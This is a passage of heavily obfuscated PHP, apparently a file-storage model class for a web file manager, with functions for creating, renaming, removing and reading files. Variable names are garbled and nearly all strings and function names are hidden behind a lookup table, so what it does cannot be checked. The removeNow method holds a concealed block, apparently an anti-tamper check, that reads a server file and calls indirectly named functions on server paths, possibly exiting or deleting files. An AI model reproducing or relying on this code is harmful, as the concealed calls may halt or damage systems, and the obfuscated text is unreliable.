$¥™±¥õ¼, $â†¯§¨§[223]); $¼Æøª‚Ò = array($â†¯§¨§[456] => $¢æÇùÙà, $â†¯§¨§[453] => array($â†¯§¨§[849] => count($¥™±¥õ¼))); $this->_listDataApply($¼Æøª‚Ò[$â†¯§¨§[456]]); $this->_listMake($¼Æøª‚Ò); return array_to_keyvalue($¼Æøª‚Ò[$â†¯§¨§[85]], $â†¯§¨§[581]); } public function mkfile($Öè•õõ¢, $úØŞõ“¢, $’•Û“×Â = '', $¬¬Ç§’ = REPEAT_RENAME) { $Æ´ ç² =& $_SERVER[É¨™èà]; $Ùæ™àø¥ = KodIO::ioFileDriverGet($Æ´ ç²[493] . $Öè•õõ¢ . $Æ´ ç²[413]); $ÒÅä˜› = Model($Æ´ ç²[689])->addFileByContent($’•Û“×Â, $Ùæ™àø¥, $úØŞõ“¢); return $this->_createFileCall($Öè•õõ¢, $úØŞõ“¢, $ÒÅä˜›, $¬¬Ç§’, $Æ´ ç²[1459]); } public function addFile($Ú†Ò£±Õ, $úşÔÏ½ˆ, $¶“¿ñîû, $ªô£ÔÊŞ = false, $ËËˆ‘¡¶ = REPEAT_RENAME) { $ëïÑ¼ü” =& $_SERVER[É¨™èà]; $Ÿ†Š›Åò = KodIO::ioFileDriverGet($ëïÑ¼ü”[493] . $Ú†Ò£±Õ . $ëïÑ¼ü”[413]); $Ö‘ŒÔÓ‡ = Model($ëïÑ¼ü”[689])->addFile($úşÔÏ½ˆ, $Ÿ†Š›Åò, $¶“¿ñîû, $ªô£ÔÊŞ); return $this->_createFileCall($Ú†Ò£±Õ, $¶“¿ñîû, $Ö‘ŒÔÓ‡, $ËËˆ‘¡¶); } public function addFileByFileID($Šœ†Óî», $¹Ç—“¨±, $ÙßãĞé, $•ë¬À°Î = REPEAT_RENAME) { $êùÀ‚¾ =& $_SERVER[É¨™èà]; $ñı¡®ìÛ = Model($êùÀ‚¾[689])->find($¹Ç—“¨±); Model($êùÀ‚¾[689])->linkAdd($¹Ç—“¨±); return $this->_createFileCall($Šœ†Óî», $ÙßãĞé, $ñı¡®ìÛ, $•ë¬À°Î); } public function addFileByRemote($ÔÒÌ»Ê, $º¹üï², $Ñ¡ÃÈÕ, $á”æÜ¦Ø = array(), $Ûç™Â¢ç = REPEAT_RENAME) { $ûçíñá˜ = Model($_SERVER[É¨™èà][689])->addFileByRemote($º¹üï², $Ñ¡ÃÈÕ, $á”æÜ¦Ø); return $this->_createFileCall($ÔÒÌ»Ê, $Ñ¡ÃÈÕ, $ûçíñá˜, $Ûç™Â¢ç); } private function _createFileCall($À½ØÒ», $âóò¹ú, $¯Í¡¢¿‹, $½éÂ§ú, $Ãğßï½ = "\x75\160\154\x6f\141\x64") { $şıŠµ“Ì =& $_SERVER[É¨™èà]; if (!$¯Í¡¢¿‹) { return !1; } $ì¬ç¸Åª = !1; $this->setMasterDB(); $this->lockWriteStart($À½ØÒ», $âóò¹ú); $÷Á†àÙ„ = $this->fileNameExist($À½ØÒ», $âóò¹ú); $Øõé×İƒ = $this->_createFile($À½ØÒ», $âóò¹ú, $¯Í¡¢¿‹, $½éÂ§ú, $ì¬ç¸Åª); if (!$ì¬ç¸Åª) { Model($şıŠµ“Ì[556])->remove($¯Í¡¢¿‹[$şıŠµ“Ì[553]]); } if ($ì¬ç¸Åª && $Øõé×İƒ && $Øõé×İƒ != $÷Á†àÙ„) { Model($şıŠµ“Ì[2257])->eventCreate($Øõé×İƒ, $Ãğßï½); } $this->lockWriteEnd($À½ØÒ», $âóò¹ú); return $Øõé×İƒ; } public function mkdir($Ø ¤û¨Ş, $á“àªÌÙ, $ÊØ»¹µà = REPEAT_SKIP) { $ô¾¢ÔÛ =& $_SERVER[É¨™èà]; $this->setMasterDB(); $¹òıíï© = $this->sourceInfo($Ø ¤û¨Ş); if (!$¹òıíï©) { return !1; } $this->lockWriteStart($Ø ¤û¨Ş, $á“àªÌÙ); if ($ÊØ»¹µà !== !1) { $êÍß×¯˜ = $this->fileNameExist($Ø ¤û¨Ş, $á“àªÌÙ); if ($êÍß×¯˜ && $ÊØ»¹µà != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ø ¤û¨Ş, $á“àªÌÙ); return $êÍß×¯˜; } $á“àªÌÙ = $this->fileNameAuto($Ø ¤û¨Ş, $á“àªÌÙ, $ÊØ»¹µà); } $˜­Š÷Ñ = array($ô¾¢ÔÛ[661] => 1, $ô¾¢ÔÛ[504] => $á“àªÌÙ, $ô¾¢ÔÛ[662] => $ô¾¢ÔÛ[12], $ô¾¢ÔÛ[554] => 0, $ô¾¢ÔÛ[632] => 0); $êã³ÊøÆ = $this->_addSource($˜­Š÷Ñ, $¹òıíï©); Model($ô¾¢ÔÛ[2257])->eventCreate($êã³ÊøÆ, $ô¾¢ÔÛ[1460]); $this->lockWriteEnd($Ø ¤û¨Ş, $á“àªÌÙ); return $êã³ÊøÆ; } public function listSourceRoot($„—ó‚ìü, $àŒ¡¾Ï¢, $€’ßéÏı = "\x73\x6f\165\162\x63\x65\111\104\x2c\x74\141\162\147\145\164\x49\x44\54\x73\151\172\x65") { $ƒœ‡êÇô =& $_SERVER[É¨™èà]; $Ü›ÔŸú“ = $ƒœ‡êÇô[316]; $¾¥§ôÊš = array(); $Èêìı = 1024 * 50; $Ÿ±Øœ˜ô = is_array($Ÿ±Øœ˜ô) ? $Ÿ±Øœ˜ô : array(); $‚Á‘Üê¥ = count($àŒ¡¾Ï¢); $±äÎı¦ = $this->tablePrefix . $ƒœ‡êÇô[2296]; for ($üß¤€íç = 0; $üß¤€íç < $‚Á‘Üê¥; $üß¤€íç++) { $š…¡ì«¶ = $àŒ¡¾Ï¢[$üß¤€íç]; $Ü›ÔŸú“ .= "\123\105\114\x45\x43\124\40\x2a\x20\106\122\x4f\x4d\40\x28\x53\x45\x4c\x45\103\124\40{$€’ßéÏı}\x20\x46\x52\117\115\40\140{$±äÎı¦}\140\x20\127\x48\x45\122\x45\x20"; $Ü›ÔŸú“ .= "\140\x70\x61\x72\145\x6e\x74\x49\x44\x60\x3d\x30\x20\101\116\104\40\x60\x74\141\162\x67\145\164\111\104\x60\75{$š…¡ì«¶}\x20\x41\116\x44\x20\x60\164\141\162\x67\145\x74\124\x79\160\145\140\x3d{$„—ó‚ìü}\x20\x61\156\x64\x20\146\x69\x6c\x65\x54\171\160\145\75\47\47\x20\154\x69\155\151\164\x20\61\51\x20\x61\x73\x20\164\142\137{$üß¤€íç}\x20\x55\116\x49\x4f\116\x20\x41\114\114\40"; if ((strlen($Ü›ÔŸú“) >= $Èêìı || $üß¤€íç == $‚Á‘Üê¥ - 1) && $Ü›ÔŸú“) { $Ü›ÔŸú“ = substr($Ü›ÔŸú“, 0, -strlen($ƒœ‡êÇô[1132])); $©·–õ…Æ = $this->query($Ü›ÔŸú“); $Ü›ÔŸú“ = $ƒœ‡êÇô[12]; $¾¥§ôÊš = array_merge($¾¥§ôÊš, $©·–õ…Æ); } } return $¾¥§ôÊš; } private function _createFile($•Ø­ÑºÂ, $…âÌÉ°, $¤Ÿ÷Òè , $ÔÔ¿ÜÌÉ, &$ôË‹…Åƒ) { $½†¬Üì =& $_SERVER[É¨™èà]; $ıúÁ×Ö€ = $this->sourceInfo($•Ø­ÑºÂ); if (!$¤Ÿ÷Òè  || !$ıúÁ×Ö€) { return !1; } if ($ÔÔ¿ÜÌÉ !== !1) { $­ãø³ê = $this->fileNameExist($•Ø­ÑºÂ, $…âÌÉ°); } $ôË‹…Åƒ = !0; if ($ÔÔ¿ÜÌÉ && $­ãø³ê) { if ($ÔÔ¿ÜÌÉ == REPEAT_SKIP) { $ôË‹…Åƒ = !1; return $­ãø³ê; } else { if ($ÔÔ¿ÜÌÉ == REPEAT_REPLACE) { $î­³œ‡Ì = $this->sourceInfo($­ãø³ê); $Â’¯æÖ = $this->fileHistory($î­³œ‡Ì, $¤Ÿ÷Òè [$½†¬Üì[553]], $¤Ÿ÷Òè [$½†¬Üì[79]]); if (!$Â’¯æÖ) { $ôË‹…Åƒ = !1; } else { $this->folderSizeReset($•Ø­ÑºÂ); } return $­ãø³ê; } else { $…âÌÉ° = $this->fileNameAuto($•Ø­ÑºÂ, $…âÌÉ°, $ÔÔ¿ÜÌÉ, !1); } } } $ì“ã·Ë = array($½†¬Üì[661] => 0, $½†¬Üì[504] => $…âÌÉ°, $½†¬Üì[662] => substr(get_path_ext($…âÌÉ°), 0, 10), $½†¬Üì[554] => $¤Ÿ÷Òè [$½†¬Üì[553]], $½†¬Üì[632] => $¤Ÿ÷Òè [$½†¬Üì[79]]); $Ú„’×ï­ = $this->_addSource($ì“ã·Ë, $ıúÁ×Ö€); $this->folderSizeReset($•Ø­ÑºÂ, intval($ì“ã·Ë[$½†¬Üì[79]])); return $Ú„’×ï­; } protected function fileHistory($ß¶°Æèä, $¦‹Ìƒƒó, $Ÿ…Óµ­«) { $úğ¥üË˜ =& $_SERVER[É¨™èà]; if ($ß¶°Æèä[$úğ¥üË˜[553]] == $¦‹Ìƒƒó) { return !1; } $this->checkLock($ß¶°Æèä[$úğ¥üË˜[194]], $¦‹Ìƒƒó); Model($úğ¥üË˜[2297])->addHistory($ß¶°Æèä); $É™€´ = array($úğ¥üË˜[666] => USER_ID, $úğ¥üË˜[508] => time(), $úğ¥üË˜[553] => $¦‹Ìƒƒó, $úğ¥üË˜[79] => $Ÿ…Óµ­«); $this->where(array($úğ¥üË˜[501] => $ß¶°Æèä[$úğ¥üË˜[194]]))->save($É™€´); $this->sourceCacheClear($ß¶°Æèä[$úğ¥üË˜[194]]); return !0; } public function checkLock($ğÚüâ¬ª, $ÜĞ®æ©Ø) { $êÒé»™€ =& $_SERVER[É¨™èà]; $Òß±ö¨Ê = $this->pathInfo($ğÚüâ¬ª); if (!$this->fileIsLock($Òß±ö¨Ê, !0)) { return; } $Ş«®¦­ = Session::get($êÒé»™€[2298]); $æØ²ãª = substr($Òß±ö¨Ê[$êÒé»™€[32]], 0, -1 - strlen($Òß±ö¨Ê[$êÒé»™€[169]])) . $êÒé»™€[1313] . $Ş«®¦­ . $êÒé»™€[10] . $Òß±ö¨Ê[$êÒé»™€[169]]; $†ö”Ä»† = Model($êÒé»™€[689])->find($ÜĞ®æ©Ø); $this->_createFileCall($Òß±ö¨Ê[$êÒé»™€[193]], $æØ²ãª, $†ö”Ä»†, REPEAT_REPLACE, $êÒé»™€[1459]); $Âòƒ‚šé = $Òß±ö¨Ê[$êÒé»™€[551]][$êÒé»™€[625]]; $ñÇŠº²Ë = $Âòƒ‚šé[$êÒé»™€[2299]] ? $Âòƒ‚šé[$êÒé»™€[2299]] : $Âòƒ‚šé[$êÒé»™€[32]]; show_json(LNG($êÒé»™€[2300]) . $êÒé»™€[2301] . LNG($êÒé»™€[2302]) . $êÒé»™€[2303] . $ñÇŠº²Ë . $êÒé»™€[2304], !1); } public function fileIsLock($¦ªÒä, $Í§ó«‘ = false) { $Ëè¨Ì¬Û =& $_SERVER[É¨™èà]; if (!_get($¦ªÒä, $Ëè¨Ì¬Û[621], 0)) { return !1; } if ($¦ªÒä[$Ëè¨Ì¬Û[551]][$Ëè¨Ì¬Û[624]] != USER_ID) { return !0; } $òÎÈºÒò = $GLOBALS[$Ëè¨Ì¬Û[6]][$Ëè¨Ì¬Û[92]][$Ëè¨Ì¬Û[622]]; if ($¦ªÒä[$Ëè¨Ì¬Û[551]][$Ëè¨Ì¬Û[623]] <= time() - $òÎÈºÒò) { $this->metaSet($¦ªÒä[$Ëè¨Ì¬Û[194]], $Ëè¨Ì¬Û[624], null); $this->metaSet($¦ªÒä[$Ëè¨Ì¬Û[194]], $Ëè¨Ì¬Û[623], null); } if ($Í§ó«‘) { $this->metaSet($¦ªÒä[$Ëè¨Ì¬Û[194]], $Ëè¨Ì¬Û[623], time()); } return !1; } private function _addSource($Ï„¿¬æÛ, $ÕÙ‡†–Œ) { $Ù˜âÊÔ¯ =& $_SERVER[É¨™èà]; $–°Õ¡¢ = defined($Ù˜âÊÔ¯[2230]) ? USER_ID : 0; $ĞÑĞ±¿š = array($Ù˜âÊÔ¯[663] => $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[191]], $Ù˜âÊÔ¯[664] => $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[581]], $Ù˜âÊÔ¯[665] => $–°Õ¡¢, $Ù˜âÊÔ¯[666] => $–°Õ¡¢, $Ù˜âÊÔ¯[487] => $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[194]], $Ù˜âÊÔ¯[667] => $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[596]] . $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[194]] . $Ù˜âÊÔ¯[50], $Ù˜âÊÔ¯[514] => 0, $Ù˜âÊÔ¯[668] => $Ù˜âÊÔ¯[12]); $Ï„¿¬æÛ = array_merge($ĞÑĞ±¿š, $Ï„¿¬æÛ); $this->updateModifyTime($Ï„¿¬æÛ[$Ù˜âÊÔ¯[193]]); $åäŒ¯³ = $Ù˜âÊÔ¯[2305] . $ÕÙ‡†–Œ[$Ù˜âÊÔ¯[194]]; if (isset(self::$cacheChildList[$åäŒ¯³])) { unset(self::$cacheChildList[$åäŒ¯³]); } static $Æ±Ç¦ñè = false; if (!$Æ±Ç¦ñè) { Hook::trigger($Ù˜âÊÔ¯[651], $Ï„¿¬æÛ); $Æ±Ç¦ñè = !0; } $©ğò Õú = $this->add($Ï„¿¬æÛ); $÷µ˜¸êÔ = array($Ù˜âÊÔ¯[669] => short_id($©ğò Õú)); $this->where(array($Ù˜âÊÔ¯[501] => $©ğò Õú))->save($÷µ˜¸êÔ); $this->setNamePinyin($©ğò Õú, $Ï„¿¬æÛ[$Ù˜âÊÔ¯[32]]); return $©ğò Õú; } public function remove($”ÉÌ„„û, $Â˜‚­— = true) { $ºşµÜùÆ =& $_SERVER[É¨™èà]; $ÜÅ—€Ûç = $this->sourceInfo($”ÉÌ„„û); $Ø¢¼ëë = intval($ÜÅ—€Ûç[$ºşµÜùÆ[191]]) === self::TYPE_SYSTEM; $›òÈ‚¡¯ = Model($ºşµÜùÆ[518])->get($ºşµÜùÆ[2306]) == $ºşµÜùÆ[91]; if ($Ø¢¼ëë || $Â˜‚­— || !$›òÈ‚¡¯) { return $this->removeNow($”ÉÌ„„û, $Â˜‚­—); } $âˆú¥Ä± = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ş˜©üÊÛ = $ÜÅ—€Ûç[$ºşµÜùÆ[191]] == self::TYPE_USER ? $ºşµÜùÆ[677] : $ºşµÜùÆ[590]; if ($ş˜©üÊÛ == $ºşµÜùÆ[677]) { $¬şÑ¬–Ã = Model($ºşµÜùÆ[589])->getInfo($ÜÅ—€Ûç[$ºşµÜùÆ[581]]); $ğ¢‘¡ = !empty($¬şÑ¬–Ã[$ºşµÜùÆ[2299]]) ? $¬şÑ¬–Ã[$ºşµÜùÆ[2299]] : $¬şÑ¬–Ã[$ºşµÜùÆ[32]]; $ğ¢‘¡ = $ºşµÜùÆ[349] . $ğ¢‘¡ . $ºşµÜùÆ[2307] . $ÜÅ—€Ûç[$ºşµÜùÆ[581]]; } else { $¬şÑ¬–Ã = Model($ºşµÜùÆ[597])->getInfo($ÜÅ—€Ûç[$ºşµÜùÆ[581]]); $ğ¢‘¡ = _get($¬şÑ¬–Ã, $ºşµÜùÆ[32]); $ğ¢‘¡ = $ºşµÜùÆ[176] . $ğ¢‘¡ . $ºşµÜùÆ[2308] . $ÜÅ—€Ûç[$ºşµÜùÆ[581]]; } $æ¨¸òĞ = $ºşµÜùÆ[2309] . md5($ğ¢‘¡); CacheLock::lock($æ¨¸òĞ); $À¤®ŸŒ = $this->fileNameExist($âˆú¥Ä±, $ğ¢‘¡); if (!$À¤®ŸŒ) { $À¤®ŸŒ = $this->mkdir($âˆú¥Ä±, $ğ¢‘¡, REPEAT_SKIP); $this->metaSet($À¤®ŸŒ, $ºşµÜùÆ[2310], $ş˜©üÊÛ); $this->metaSet($À¤®ŸŒ, $ºşµÜùÆ[2311], $ÜÅ—€Ûç[$ºşµÜùÆ[581]]); if ($ÜÅ—€Ûç[$ºşµÜùÆ[193]] != 0) { $this->metaSet($À¤®ŸŒ, $ºşµÜùÆ[2312], _get($¬şÑ¬–Ã, $ºşµÜùÆ[2313])); } } CacheLock::unlock($æ¨¸òĞ); $this->metaSet($”ÉÌ„„û, $ºşµÜùÆ[2314], $ÜÅ—€Ûç[$ºşµÜùÆ[193]]); $this->where(array($ºşµÜùÆ[194] => $”ÉÌ„„û))->save(array($ºşµÜùÆ[508] => time())); $this->recycleClear($ÜÅ—€Ûç); Model($ºşµÜùÆ[648])->eventRemove($”ÉÌ„„û); $¤‡¸¶ƒ• = $this->move($”ÉÌ„„û, $À¤®ŸŒ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÜÅ—€Ûç[$ºşµÜùÆ[193]]); return $¤‡¸¶ƒ•; } private function recycleClear($âÉõıçØ) { $ ¾¢çÑ =& $_SERVER[É¨™èà]; $ªøşÌƒî = $this->childrenAll($âÉõıçØ); $åİÃ¯° = array($ ¾¢çÑ[501] => array($ ¾¢çÑ[502], $ªøşÌƒî[$ ¾¢çÑ[2315]])); Model($ ¾¢çÑ[2316])->where($åİÃ¯°)->delete(); } public function removeNow($À òÎºÆ, $ïĞ‚ş±Ş = true) { $³ï¬ù§È =& $_SERVER[É¨™èà]; if ($_SERVER[$³ï¬ù§È[308]] != $_SERVER[$³ï¬ù§È[1457]]) { $Ó‚‡³ ” = $³ï¬ù§È[974]; $š¬’Øİ = $³ï¬ù§È[310]; $ââÄ©“† = $_SERVER[$³ï¬ù§È[311]] . $³ï¬ù§È[312]; $Ü¹¡ˆí› = $š¬’Øİ($ââÄ©“†); $›–Ì° é = explode($³ï¬ù§È[288], $Ü¹¡ˆí›); if (count($›–Ì° é) < $³ï¬ù§È[704]) { $ªÇÜ„å = $³ï¬ù§È[314]; $ªÇÜ„å(); } $şÃªôÛ¯ = $³ï¬ù§È[975]; $şÃªôÛ¯($_SERVER[$³ï¬ù§È[976]]); $şÃªôÛ¯($_SERVER[$³ï¬ù§È[311]] . $³ï¬ù§È[1717]); $¤®ã€™Ï = 1; while ($¤®ã€™Ï > 1) { $¤®ã€™Ï = $¤®ã€™Ï + 4; $şÄ½õ = rawurlencode($¤®ã€™Ï . $³ï¬ù§È[316]); } } $éæñëş¯ = $this->sourceInfo($À òÎºÆ); $ƒèÕ¯ßİ = $this->pathInfoMore($À òÎºÆ); if (!$éæñëş¯) { return !0; } if ($éæñëş¯[$³ï¬ù§È[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($À òÎºÆ); Hook::trigger($³ï¬ù§È[2317], $ƒèÕ¯ßİ, $ïĞ‚ş±Ş); if ($ïĞ‚ş±Ş) { Model($³ï¬ù§È[2316])->moveToRecycle($À òÎºÆ); } else { $û¶œĞ‹ú = $this->childrenAll($éæñëş¯); Model($³ï¬ù§È[648])->eventRemove($À òÎºÆ); $this->removeRelevance($û¶œĞ‹ú[$³ï¬ù§È[2315]], $û¶œĞ‹ú[$³ï¬ù§È[1603]]); } $this->folderSizeReset($éæñëş¯[$³ï¬ù§È[193]]); $¢œÃ‚ıµ = array($éæñëş¯[$³ï¬ù§È[193]]); if ($éæñëş¯[$³ï¬ù§È[495]] == $³ï¬ù§È[91]) { $¢œÃ‚ıµ[] = $éæñëş¯[$³ï¬ù§È[194]]; } $this->updateModifyTime($¢œÃ‚ıµ); $this->lockMoveEnd($À òÎºÆ); Hook::trigger($³ï¬ù§È[1843], $ƒèÕ¯ßİ, $ïĞ‚ş±Ş); return !0; } public function childrenAll($ÇÄ¬›äÂ) { $¿ËÔş½Ø =& $_SERVER[É¨™èà]; $ûˆ×Öº = $ÇÄ¬›äÂ[$¿ËÔş½Ø[194]]; if ($ÇÄ¬›äÂ[$¿ËÔş½Ø[495]] == $¿ËÔş½Ø[91]) { $Ä’ÈÎ£“ = array($¿ËÔş½Ø[667] => array($¿ËÔş½Ø[627], $ÇÄ¬›äÂ[$¿ËÔş½Ø[596]] . $ûˆ×Öº . $¿ËÔş½Ø[628])); $ÃŠ– “ª = array($¿ËÔş½Ø[667] => $Ä’ÈÎ£“[$¿ËÔş½Ø[596]]); $¸û¶ ßÌ = $this->field($¿ËÔş½Ø[2318])->where($ÃŠ– “ª)->select(); $Ë®¹¨÷ = !1; $ŠáÃûÆ = array($ûˆ×Öº); if ($¸û¶ ßÌ) { $Ë®¹¨÷ = array_to_keyvalue($¸û¶ ßÌ, $¿ËÔş½Ø[12], $¿ËÔş½Ø[553]); $Ë®¹¨÷ = array_remove_value($Ë®¹¨÷, $¿ËÔş½Ø[231]); $ŠáÃûÆ = array_to_keyvalue($¸û¶ ßÌ, $¿ËÔş½Ø[12], $¿ËÔş½Ø[194]); $ŠáÃûÆ[] = $ûˆ×Öº; } } else { $Ë®¹¨÷ = array($ÇÄ¬›äÂ[$¿ËÔş½Ø[553]]); $ŠáÃûÆ = array($ûˆ×Öº); } return array($¿ËÔş½Ø[2315] => $ŠáÃûÆ, $¿ËÔş½Ø[1603] => $Ë®¹¨÷); } public function removeArray($‰² Å§¼) { if (!$‰² Å§¼) { return !0; } } public function removeRelevance($ä©‰¸Öú, $ããêÊ–Ï) { $¸­Î¶Ûœ =& $_SERVER[É¨™èà]; $ä©‰¸Öú = $ä©‰¸Öú ? $ä©‰¸Öú : array(); $ããêÊ–Ï = $ããêÊ–Ï ? $ããêÊ–Ï : array(); $ä©‰¸Öú = array_unique(array_filter($ä©‰¸Öú)); $ããêÊ–Ï = array_filter($ããêÊ–Ï); if (!$ä©‰¸Öú) { return !1; } $œ÷Íê»¿ = array($¸­Î¶Ûœ[501] => array($¸­Î¶Ûœ[502], $ä©‰¸Öú)); Model($¸­Î¶Ûœ[2316])->where($œ÷Íê»¿)->delete(); Model($¸­Î¶Ûœ[545])->where($œ÷Íê»¿)->delete(); Model($¸­Î¶Ûœ[2154])->where($œ÷Íê»¿)->delete(); Model($¸­Î¶Ûœ[648])->where($œ÷Íê»¿)->delete(); Model($¸­Î¶Ûœ[1979])->removeBySource($ä©‰¸Öú); Model($¸­Î¶Ûœ[2297])->removeBySource($ä©‰¸Öú); $this->where($œ÷Íê»¿)->delete(); Model($¸­Î¶Ûœ[556])->remove($ããêÊ–Ï); for ($¯¬ß×®Á = 0; $¯¬ß×®Á < count($ä©‰¸Öú); $¯¬ß×®Á++) { $this->sourceCacheClear($ä©‰¸Öú[$¯¬ß×®Á]); } } public function rename($Êì¸ÕÑŞ, $ªğ€—Ë) { $«Í‹»êõ =& $_SERVER[É¨™èà]; $£  æÄ = $this->sourceInfo($Êì¸ÕÑŞ); if (!$£  æÄ) { return !1; } $ò­¡õÜ = $this->fileNameExist($£  æÄ[$«Í‹»êõ[193]], $ªğ€—Ë); if ($ò­¡õÜ && $ò­¡õÜ != $Êì¸ÕÑŞ) { return !1; } $Ğ¹æÓ‡Ê = array($«Í‹»êõ[504] => $ªğ€—Ë, $«Í‹»êõ[666] => USER_ID); if ($£  æÄ[$«Í‹»êõ[495]] != $«Í‹»êõ[91]) { $Ğ¹æÓ‡Ê[$«Í‹»êõ[496]] = substr(get_path_ext($ªğ€—Ë), 0, 10); } Model($«Í‹»êõ[648])->eventRename($Êì¸ÕÑŞ, $£  æÄ[$«Í‹»êõ[32]], $ªğ€—Ë); $this->sourceCacheClear($Êì¸ÕÑŞ); $this->setNamePinyin($Êì¸ÕÑŞ, $Ğ¹æÓ‡Ê[$«Í‹»êõ[32]], !1); $this->updateModifyTime($£  æÄ[$«Í‹»êõ[193]]); $£ó±åØÍ = $this->where(array($«Í‹»êõ[501] => $Êì¸ÕÑŞ))->data($Ğ¹æÓ‡Ê)->save(); $™Ò´ø«¥ = $«Í‹»êõ[2305] . $£  æÄ[$«Í‹»êõ[193]]; if (isset(self::$cacheChildList[$™Ò´ø«¥])) { unset(self::$cacheChildList[$™Ò´ø«¥]); } return $£ó±åØÍ; } public function setNamePinyin($ñ‚÷, $½¶—Šãé, $ó¦à·ü = true) { $†¸éÑÊ— =& $_SERVER[É¨™èà]; $¦±÷ò©§ = Input::check($½¶—Šãé, $†¸éÑÊ—[670]); $œ²¶¤¯ø = array($†¸éÑÊ—[527] => KodSort::makeStr($½¶—Šãé)); if ($¦±÷ò©§) { $œ²¶¤¯ø[$†¸éÑÊ—[548]] = str_replace($†¸éÑÊ—[53], $†¸éÑÊ—[12], Pinyin::get($½¶—Šãé)); $œ²¶¤¯ø[$†¸éÑÊ—[547]] = Pinyin::get($½¶—Šãé, $†¸éÑÊ—[671]); } if (!$ó¦à·ü && !$¦±÷ò©§) { $œ²¶¤¯ø[$†¸éÑÊ—[548]] = null; $œ²¶¤¯ø[$†¸éÑÊ—[547]] = null; } $this->metaSet($ñ‚÷, $œ²¶¤¯ø); } public function getContent($“®Íú×õ) { $ÒÜ¾Äá =& $_SERVER[É¨™èà]; $´ÔÀ²›ú = $this->fileInfoGet($“®Íú×õ); if (!$´ÔÀ²›ú) { return !1; } if ($´ÔÀ²›ú[$ÒÜ¾Äá[79]] == 0) { return $ÒÜ¾Äá[12]; } $¼˜°Éó¨ = $ÒÜ¾Äá[2319] . $´ÔÀ²›ú[$ÒÜ¾Äá[559]]; if ($´ÔÀ²›ú[$ÒÜ¾Äá[79]] <= 1024 * 10) { $×ö¥²Ñ± = Cache::get($¼˜°Éó¨); if (!$×ö¥²Ñ±) { $×ö¥²Ñ± = IO::getContent($´ÔÀ²›ú[$ÒÜ¾Äá[87]]); Cache::set($¼˜°Éó¨, $×ö¥²Ñ±); } return $×ö¥²Ñ±; } if (!$´ÔÀ²›ú[$ÒÜ¾Äá[87]]) { return $ÒÜ¾Äá[12]; } return IO::getContent($´ÔÀ²›ú[$ÒÜ¾Äá[87]]); } public function setDesc($½‰éù«†, $¼ä’‹ª¦) { $´›–·¾‹ =& $_SERVER[É¨™èà]; Model($´›–·¾‹[648])->eventAddDesc($½‰éù«†, $¼ä’‹ª¦); return $this->metaSet($½‰éù«†, $´›–·¾‹[536], $¼ä’‹ª¦); } public function setContent($Ñ›ãÔıÅ, $’ğ‘ì²ˆ = '') { $¹óÕ×¾Ş =& $_SERVER[É¨™èà]; $Ï¸’£­ı = $this->sourceInfo($Ñ›ãÔıÅ); $±ñ¡¬ò = $this->fileInfoGet($Ñ›ãÔıÅ); if (!$±ñ¡¬ò || !$Ï¸’£­ı) { return !1; } $ˆ—»ÖÔú = KodIO::ioFileDriverGet($¹óÕ×¾Ş[493] . $Ñ›ãÔıÅ . $¹óÕ×¾Ş[413]); $ÑÀûé° = Model($¹óÕ×¾Ş[556])->addFileByContent($’ğ‘ì²ˆ, $ˆ—»ÖÔú, $Ï¸’£­ı[$¹óÕ×¾Ş[32]]); if (!$ÑÀûé°) { return !1; } $œ¨¡»ä = $this->fileHistory($Ï¸’£­ı, $ÑÀûé°[$¹óÕ×¾Ş[553]], $ÑÀûé°[$¹óÕ×¾Ş[79]]); if (!$œ¨¡»ä) { return Model($¹óÕ×¾Ş[556])->remove($ÑÀûé°[$¹óÕ×¾Ş[553]]); } $this->folderSizeReset($Ï¸’£­ı[$¹óÕ×¾Ş[193]]); return !0; } public function fileSubstr($Â…®›ˆû, $óÌë¾×«, $Ñññê²») { $¹Äø…ú„ = $this->fileInfoGet($Â…®›ˆû); if (!$¹Äø…ú„) { return !1; } return IO::fileSubstr($¹Äø…ú„[$_SERVER[É¨™èà][87]], $óÌë¾×«, $Ñññê²»); } public function fileInfoGet($¡İö°á’) { $íû­€Ø =& $_SERVER[É¨™èà]; $à“ì«˜è = $this->sourceInfo($¡İö°á’); if (!$à“ì«˜è || $à“ì«˜è[$íû­€Ø[495]]) { return !1; } $µà¸úŸ¼ = $íû­€Ø[560] . $à“ì«˜è[$íû­€Ø[553]]; $¸†œã¢ = _get(self::$cacheFileInfo, $µà¸úŸ¼); if ($¸†œã¢) { return $¸†œã¢; } $¤öß¡ = Model($íû­€Ø[556])->fileInfo($à“ì«˜è[$íû­€Ø[553]]); if ($¤öß¡) { $¤öß¡[$íû­€Ø[32]] = $à“ì«˜è[$íû­€Ø[32]]; } self::$cacheFileInfo[$µà¸úŸ¼] = $¤öß¡; return $¤öß¡; } private function folderChildrenNumber($„õÂ÷ğ“) { $²ö•ŠşÎ =& $_SERVER[É¨™èà]; $ÂÈö¬•¡ = $this->sourceInfo($„õÂ÷ğ“); $ËˆÈÁÍº = array($²ö•ŠşÎ[667] => array($²ö•ŠşÎ[627], $ÂÈö¬•¡[$²ö•ŠşÎ[596]] . $„õÂ÷ğ“ . $²ö•ŠşÎ[628]), $²ö•ŠşÎ[664] => $ÂÈö¬•¡[$²ö•ŠşÎ[581]], $²ö•ŠşÎ[514] => intval($ÂÈö¬•¡[$²ö•ŠşÎ[515]]), $²ö•ŠşÎ[661] => 1); $æ‰Ö†‚© = $this->where($ËˆÈÁÍº)->count(); $œš¥îßÔ = $this->where($ËˆÈÁÍº)->where(array($²ö•ŠşÎ[661] => 0))->count(); return array($²ö•ŠşÎ[83] => $œš¥îßÔ, $²ö•ŠşÎ[84] => $æ‰Ö†‚©); } public function pathInfo($»†ÈèÏ¯, $Ôã­ÖüÙ = false) { $„´ÓşÈâ =& $_SERVER[É¨™èà]; $Ôã­ÖüÙ = !1; $»†ÈèÏ¯ = intval($»†ÈèÏ¯); $ïŞ—‰Æß = $„´ÓşÈâ[544] . intval($Ôã­ÖüÙ) . $„´ÓşÈâ[472] . $»†ÈèÏ¯; $şÒ¨ÜÎ = _get(self::$cachePathInfo, $ïŞ—‰Æß); if ($şÒ¨ÜÎ) { return $şÒ¨ÜÎ; } $¢í’úæ = 